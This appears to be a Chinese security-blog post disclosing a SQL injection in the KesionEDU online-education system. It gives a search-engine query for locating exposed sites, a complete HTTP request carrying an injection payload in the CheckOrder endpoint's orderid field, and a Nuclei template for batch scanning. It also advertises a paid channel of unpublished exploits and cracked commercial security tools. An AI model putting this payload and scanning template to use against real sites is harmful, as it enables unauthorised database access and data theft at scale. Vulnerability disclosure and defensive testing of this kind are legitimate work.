#  EDU-Kesion科汛开发的在线教育建站系统存在SQL注入漏洞 (大量存在含POC新接口) | 漏洞预警   
原创 漏洞复现Tony  渗透安全HackTwo   2024-12-27 08:06  
  
###   
#   
0x01 产品简介  
        科汛网校KesionEDU是KESION科汛开发的在线教育建站系统，支持在线直播教学、课程点播、录播授课等多种教学方式，满足不同场景下的教学需求。提供问答互动、学习点评、在线笔记等功能，增强学员与教师之间的互动交流。拥有在线考试系统，支持单选、多选、问答等多种题型，方便学员进行课后测练和考试。供求职招聘功能，方便教育机构网罗各地人才，增强平台吸引力。提供全方位的技术支持和售后服务，确保教育机构在使用过程中无后顾之忧。是教育机构搭建在线教育平台的理想选择，利用测绘引擎搜索发现影响资产1100+。  
  
**POC在末尾下载**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq7oibPtW1BZZGJa8Gjku3X0TtNh3FicYibCHrLNsKKicR8OPkAYVfLayCjRQHziaWVwBEZO6sd5W8VYECg/640?wx_fmt=png&from=appmsg "")  
  
**声明******  
  
> 请自行搭建环境进行漏洞测试，该公众号或作者星球分享的工具、项目、漏洞仅供安全研究与学习之用请勿用于非法行为，如用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
  
  
**TIPS:**  
**末尾领取资料及福利-批量检测脚本在末尾**  
  
0x02 漏洞描述       SQL注入被广泛用于非法入侵网站服务器，获取网站控制权。它是应用层上的一种安全漏洞。通常在设计存在缺陷的程序中，对用户输入的数据没有做好过滤，导致恶意用户可以构造一些SQL语句让服务器去执行，从而导致数据库中的数据被窃取，篡改，删除，以及进一步导致服务器被入侵等危害。0x03 Zoomeye语法http.body="/KS_Inc/static/edu"0x04 漏洞复现request packet（NucleiPOC在末尾）POST /webapi/APP/CheckOrder HTTP/1.1Host:User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36Connection: closeContent-Length: 242Accept: application/json, text/javascript, */*; q=0.01Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type: application/x-www-form-urlencoded; charset=UTF-8Priority: u=0X-Requested-With: XMLHttpRequest{"orderid":"1' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1","ordertype":"1"}Nuclei批量检测POC（末尾有Nuclei批量检测POC）‍‍‍0x05 修复建议关闭互联网暴露面或接口设置访问权限，官方已经推出新版本，建议升级到最新版。0x06 内部VIP星球介绍-V1.3        需要加入内部知识星球可点击下方链接，资源包含但不限于网上未公开的1day/0day漏洞(2024 Day漏洞库更新漏洞共3200+）2024最新SRC/CNVD/Edu实战挖掘技巧报告，红队内网横向渗透，代码审计，JS逆向，SRC培训等课程。圈子对新人友好，加入圈子拥有FOFA shadan 360Quake 零零信安 Hunter等等高级会员账号，SRC文档，武器库。圈子里面资料价值至少在10K以上，目前星球内部主题1100+，资源3w+，其他和网盘资源10w+并持续更新中，加入星球快人一步获取最新POC，越早加入价格越低。👉点击了解--->>>>内部VIP知识星球福利介绍V1.3版本-星球介绍👈本月内部星球新增漏洞(每日更新0day/1day)科汛网校KesionEDU CheckOrder SQL注入漏洞杭州平治科技一卡通系统 AddPkFreePartyMFCar 存在SQL注入漏洞虹安Heimdall DLP数据泄漏防护系统 pushSetup.do SQL注入漏洞月子会所ERP管理云平台 GetData.ashx SQL注入致RCE漏洞北京中犇科技有限公司数字化智能中台系统login存在SQL注入漏洞博斯外贸管理软件V6.0 logined.jsp存在SQL注入漏洞企企通互联网解决方案系统srm getuserinfo 存在信息泄露漏洞快云服务器小助手 getdetail 存在任意文件文件读取漏洞赛诸葛数字化智能中台系统 login 存在SQL注入漏洞网神SecFox运维安全管理与审计系统存在 FastJson反序列化RCE漏洞用友-友数聚科技CPAS审计管理系统V4 getCurserIfAllowLogin 存在SQL注入漏洞西联软件移动门店管理系统 StreamToFile 存在文件上传致RCE漏洞博斯外贸管理软件V6.0 loginednew.jsp 存在SQL注入漏洞网上阅卷系统存在弱口令漏洞卓软计量业务管理平台 image.ashx 任意文件读取漏洞WordPress File Upload 插件存在任意文件读取漏洞当虹科技 Arcvideo Live存在任意文件上传漏洞TENDA 11N无线路由器Index 越权访问漏洞勤云科技期刊采编CMS存在SQL注入漏洞全媒体采编平台V3.0-工作平台UserSelect未授权访问漏洞EasyCVR 视频管理平台adduser存在任意用户添加漏洞协众OA系统接口checkLoginQrCode存在SQL注入漏洞云连POS-ERP管理系统ZksrService存在SQL注入漏洞Craft CMS 模板注入导致 Rce漏洞复现(CVE-2024-56145)致远OA correct任意文件读取（后台）漏洞蓝凌EKP系统webservice多个任意文件读取漏洞（合集）蓝凌EKP系统接口sysFormMainDataInsystemWebservice存在任意文件读取漏洞灵当CRM getMyAmbassr 存在SQL注入漏洞灵当CRM uploadfile.php 存在任意文件上传致RCE漏洞用友-友数聚科技CPAS审计管理系统V4wnPlugs存在任意文件读取安科瑞-智能环保云平台 getenterpriseinfoy 存在SQL注入漏洞神州数码DCME-320 未授权访问漏洞神州数码DCME-320 online_list.php任意文件读取漏洞蓝凌EIS fl_define_edit.aspx存在SQL注入漏洞CyberPanel存在身份认证 命令注入漏洞泛微-云桥e-Bridge checkMobile SQL注入漏洞方正畅享全媒体新闻采编系统 reportCenter 存在SQL注入漏洞方正畅享全媒体新闻采编系统 screen存在SQL注入漏洞用友U8 Cloud ReleaseRepMngAction 存在SQL注入漏洞云连POS-ERP管理系统wnload.action存在任意文件读取漏洞CRMEB save_basics存在任意文件下载漏洞(CVE-2024-52726)Apache Tomcat 远程代码执行漏洞（CVE-2024-50379）Mitel企业协作平台IDACall存在任意文件读取漏洞短视频系统视频知识付费系统request_by_curl存在前台任意文件读取漏洞飞鱼星路由器htpasswd存在信息泄露漏洞秒优科技供应链管理系Action存在SQL注入漏洞OpenWRT 弱口令登录导致任意文件读取Spring Framework存在目录遍历漏洞(CVE-2024-38819)大华DSS数字监控系统attachmentwnloadAtt.action任意文件读取漏洞海康威视运行管理中心applyST远程代码执行漏洞神州数码DCME-320 online_list.php 任意文件读取漏洞图书馆管理平台Template存在任意文件读取漏洞泛微e-cology 9 x.FilwnloadLocation存在SQL注入漏洞妈妈宝盒-ERP UploadHandler存在任意文件读取漏洞上海汉塔网络科技有限公司上网行为管理系统存在远程命令执行漏洞圣乔ERP系wnloadFile存在任意文件读取漏洞JeecgBoot passwordChange 任意用户密码重置漏洞next.js 存在缓存中毒漏洞(CVE-2024-46982)Cloudlog request_form 存在SQL注入漏洞泛微-云桥e-Bridge addTasteJsonp SQL注入漏洞黄药师药业管理软件XSDService.asmx存在任意文件上传漏洞Apache Struts 存在远程代码执行漏洞(CVE-2024-53677)Sitecore CMS 未经身份验证export 任意文件读取漏洞复现(CVE-2024-6781) 昂捷CRM Cwsuploadpicture任意文件读取漏洞HB1910数字IP程控交换机generate.php存在远程命令执行漏洞 Cleo文件传输软件Synchronization 存在任意文件读取漏洞(CVE-2024-50623)蓝凌OA thirdimsyncforkkwebservice 存在任意文件读取漏洞CVE-2024-53677-S2-067-ALOK.zipDockerUI info 未授权访问漏洞Emlog-Pro 2.4.1最新版存在命令执行漏洞杜特网上订单系统getUserImage SQL注入漏洞DockerUI存在弱口令漏洞蓝凌EIS fl_define_flow_chart.aspx存在SQL注入漏洞中科网威anysec安全网关arping存在后台远程命令执行漏洞用友GRP-U8系统taskmanager_login存在SQL注入漏洞孚盟云 MailAjax.ashx SQL注入漏洞九思OA系统upload_l.jsp存在任意文件上传漏洞用友U8-CRM rellistname Sql注入漏洞安徽生命港湾信息技术有限公司服务配置工具平台wnload 任意文件读取漏洞Yapi存在远程命令执行漏洞玛格泰克科技发展有限公司系统默认口令漏洞圣乔ERP系统 ResultSetConvertor 存在SQL注入漏洞圣乔ERP系统 SingleRowQueryConvertor 存在SQL注入漏洞圣乔ERP系统 存在DwrUtil SQL注入漏洞锁群管理系统key.aspx存在默认cookie登录漏洞用友NC系统接口yerfilewn bill存在SQL注入漏洞畅捷通T-Plus ajaxpro Ufida SQL注入漏洞MitelMiCollab 身份绕过导致任意文件读取漏洞复现WordPress Query Console插件 未授权RCE漏洞复现(CVE-2024-50498) 圣乔ERP系统uploadFile存在任意文件上传漏洞百易云资产管理运营系统 leaseImaRead存在SQL注入 漏洞EasyCVR taillog存在任意文件读取漏洞易宝OA GetUDEFStreamID 存在Sql注入漏洞用友NC yerfilwn SQL注入漏洞(XVE-2024-34596) 三汇SMG 网关管理软件 smgsuperadmin 存在信息泄露漏洞顺景ERP TMScmQuoteGetFile 任意文件读取漏洞PbootCMS tag存在Sql注入漏洞中成科信票务管理系统 ReturnTicketPlance.ashx SQL注入漏洞WordPress ElementorPageBuilder插件 任意文件读取漏洞YourPHPCMS系统login_checkEmail存在sql注入漏洞YourPHPCMS系统Register_checkEmail存在sql注入漏洞华天动力OA系统upload.jsp任意文件上传漏洞同享人力管理管理平台ActiveXConnector.asmx信息泄露漏洞紫光电子档案管理系统 uploadscan 存在Sql注入ProjectSend身份认证绕过漏洞(CVE-2024-11680)Sitecore CMS 未经身份验证任意文件读取漏洞复现(CVE-2024-46938) 科拓全智能停车收费系统T_SellFrom.aspx存在SQL注入漏洞时空WMS-仓储精细化管理系统 ImageAdd.ashx 文件上传致RCE漏洞时空WMS-仓储精细化管理系统 SaveCrash.ashx 文件上传致RCE漏洞信呼OA办公系统后台uploadAction存在SQL注入用友CRM leadconversion 存在SQL注入漏洞用友NC-cartabletimelineList存在SQL注入漏洞电子图书阅读平wnFile存在SQL注入漏洞JeecgBoot getTotalData 存在SQL注入漏洞（CVE-2024-48307）电子资料管理系统 ImageUpload.ashx 文件上传致RCE漏洞苏州科达科技股份有限公司多媒体录播系统存在信息泄露漏洞万能门店小程序管理系统 onepic_uploade 任意文件上传漏洞 圣乔ERP系统NamedParameterSingleRowQueryConvertor.queryForString.dwr存在SQL注入漏洞同享人力资源管理系统 administration 存在sql注入漏洞微信活码系统updateInfos前台未授权任意用户密码修改内部新增一些免杀工具，付费资源渗透工具等...Nuclei-YamlPocid: KesionEDU-CheckOrder-SQLiinfo:  name: KesionEDU-CheckOrder-SQLi  author: HK  severity: high  metadata:    fofa-query: body="/KS_Inc/static/edu"http:  - raw:    - |      POST /webapi/APP/CheckOrder HTTP/1.1      Host:       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2      Content-Type: application/x-www-form-urlencoded; charset=UTF-8      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0      Accept: application/json, text/javascript, */*; q=0.01      Priority: u=0      Accept-Encoding: gzip, deflate      X-Requested-With: XMLHttpRequest             {"orderid":"1' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1","ordertype":"1"}    matchers-condition: and    matchers:      - type: word        words:        - "qkpzq1qqkkq"      - type: status        status:        - 500  
  
**结尾**  
  
# 免责声明  
  
  
# 获取方法  
  
  
回复“**app**  
" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。  
  
回复“**书籍**" 获取 网络安全相关经典书籍电子版pdf  
  
压缩包解压密码：HackTwo  
  
  
  
# 免责声明  
  
  
        
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。  
本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
# 往期推荐  
  
  
**1. 内部VIP知识星球福利介绍V1.3版本**  
  
**2. 最新BurpSuite2023.12.1专业版中英文版下载**  
  
**3. 最新Nessus2024下载Windows/Linux**  
  
[4. 最新xray1.9.11高级版下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483882&idx=1&sn=e1bf597eb73ee7881ae132cc99ac0c8e&chksm=cf16a75af8612e4c73eda9f52218ccfc6de72725eb37aff59e181435de095b71e653b446c521&scene=21#wechat_redirect)  
  
  
[5. 最新HCL AppScan Standard 10.4.128273破解版下载](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483850&idx=1&sn=8fad4ed1e05443dce28f6ee6d89ab920&chksm=cf16a77af8612e6c688c55f7a899fe123b0f71735eb15988321d0bd4d14363690c96537bc1fb&scene=21#wechat_redirect)  
  
  
  
###### 渗透安全HackTwo  
  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
喜欢的朋友可以点赞转发支持一下  
  
  
